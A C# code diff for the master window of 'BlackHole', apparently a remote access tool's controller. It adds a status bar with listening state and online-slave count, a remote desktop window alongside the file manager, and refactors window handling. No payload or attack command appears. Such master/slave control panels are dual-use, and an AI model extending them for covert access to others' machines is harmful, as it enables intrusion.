@@ -51,12 +51,36 @@ namespace BlackHole.Master
         /// <summary>
         /// 
         /// </summary>
+        public SlaveMonitorModel ViewModelMonitor
+        {
+            get;
+            private set;
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void OnLoaded(object sender, RoutedEventArgs e)
+        {
+            Initialize();
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
         private void Initialize()
         {
+            m_childWindows = new List<Window>();
+
             SlavesList.DataContext = ViewModelSlaves = new ViewModelCollection<Slave>();
+            SlaveStatusBar.DataContext = ViewModelMonitor = new SlaveMonitorModel();
 
             Slave.SlaveEvents.Subscribe(this);
             NetworkService.Instance.Start();
+
+            ViewModelMonitor.SetListeningState("Listening");
 
             AddInfoMessage("NetworkService running...");
         }
@@ -98,11 +122,13 @@ namespace BlackHole.Master
                 switch ((SlaveEventType)ev.EventType)
                 {
                     case SlaveEventType.CONNECTED:
-                        ViewModelSlaves.Items.Add(ev.Source);
+                        ViewModelSlaves.AddItem(ev.Source);
+                        UpdateOnlineSlaves();
                         AddInfoMessage($"connected slave={ev.Source.ToString()}");
                         break;
                     case SlaveEventType.DISCONNECTED:
-                        ViewModelSlaves.Items.Remove(ev.Source);
+                        ViewModelSlaves.RemoveItem(ev.Source);
+                        UpdateOnlineSlaves();
                         CloseSlaveWindows(ev.Source.Id);
                         AddInfoMessage($"disconnected slave={ev.Source.ToString()}");
 
@@ -116,15 +142,19 @@ namespace BlackHole.Master
                 }
             });
         }
-
-
-
+        
+        /// <summary>
+        /// 
+        /// </summary>
+        private void UpdateOnlineSlaves() => 
+            ViewModelMonitor.SetOnlineSlaves(ViewModelSlaves.Items.Count);
+        
         /// <summary>
         /// 
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void MainWindow_Closing(object sender, System.ComponentModel.CancelEventArgs e)
+        private void OnClosing(object sender, System.ComponentModel.CancelEventArgs e)
         {
             NetworkService.Instance.Stop();
             m_childWindows.ForEach(async (window) => await window.ExecuteInDispatcher(() => window.Close()));
@@ -136,25 +166,35 @@ namespace BlackHole.Master
         /// <param name="sender"></param>
         /// <param name="e"></param>
         private void OpenFileManager(object sender, RoutedEventArgs e)
+            => OpenSlaveWindowIfSelected(slave => new FileManager(slave));
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void OpenRemoteDesktop(object sender, RoutedEventArgs e)
+            => OpenSlaveWindowIfSelected(slave => new RemoteDesktop(slave));
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <typeparam name="T"></typeparam>
+        /// <param name="creator"></param>
+        private void OpenSlaveWindowIfSelected<T>(Func<Slave, T> creator) where T : SlaveWindow
         {
             if (SlavesList.SelectedItem == null)
                 return;
 
-            RegisterOrOpenChildWindow(new FileManager((Slave)SlavesList.SelectedItem));
+            RegisterOrOpenChildWindow(creator((Slave)SlavesList.SelectedItem));
         }
 
         /// <summary>
         /// 
         /// </summary>
         /// <param name="slaveId"></param>
-        private List<Window> FindSlaveWindows(int slaveId)
-        {
-            var windows = new List<Window>();
-            foreach (var window in m_childWindows.OfType<SlaveWindow>())
-                if (window.Slave.Id == slaveId)
-                    windows.Add(window);
-            return windows;
-        }
+        private List<SlaveWindow> FindSlaveWindows(int slaveId) 
+            => m_childWindows.OfType<SlaveWindow>().Where(window => window.Slave.Id == slaveId).ToList();
 
         /// <summary>
         /// 
@@ -193,7 +233,7 @@ namespace BlackHole.Master
             Slave.SlaveEvents.Subscribe((ev) => ev.Source.Id == window.Slave.Id, window);
 
             m_childWindows.Add(window);
-
+            
             // finally, open up the window
             window.Show();
         }
